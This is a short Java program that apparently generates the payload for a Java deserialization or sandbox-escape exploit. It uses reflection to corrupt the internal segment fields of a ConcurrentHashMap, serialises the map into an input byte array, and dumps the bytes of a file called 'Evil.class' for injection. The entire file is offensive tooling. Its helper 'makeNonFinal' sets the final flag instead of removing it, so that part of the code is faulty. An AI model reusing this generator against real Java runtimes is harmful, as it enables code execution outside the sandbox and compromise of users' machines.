import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Arrays;
import java.util.concurrent.ConcurrentHashMap;

import java.io.*;

public class Make {

	private static void makeNonFinal(Field f) throws Exception {
		Field modifiersF = Field.class.getDeclaredField("modifiers");
		modifiersF.setAccessible(true);
		int m = (Integer)modifiersF.get(f);
		
		modifiersF.set(f, m | Modifier.FINAL );
		
		
	}
	public static void main(String []args) throws Exception {
		ConcurrentHashMap map = new ConcurrentHashMap(1);
		
		Field segmentShiftF = ConcurrentHashMap.class.getDeclaredField("segmentShift");
		Field segmentMaskF = ConcurrentHashMap.class.getDeclaredField("segmentMask");
		
		segmentShiftF.setAccessible(true);
		segmentMaskF.setAccessible(true);
		
		makeNonFinal(segmentShiftF);
		makeNonFinal(segmentMaskF);
		
		segmentShiftF.set(map, 0);
		segmentMaskF.set(map, 0x40000); // 0xFFFC 0x7FF00
		
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(bos);
		oos.writeObject(map);
		
		System.out.println("INPUT = " + Arrays.toString(bos.toByteArray()));
		
		FileInputStream f = new FileInputStream("Evil.class");
		byte[] bytes = new byte[f.available()];
		f.read(bytes);
		
		System.out.println("EVIL_CLASS = " + Arrays.toString(bytes));
	}
	
}
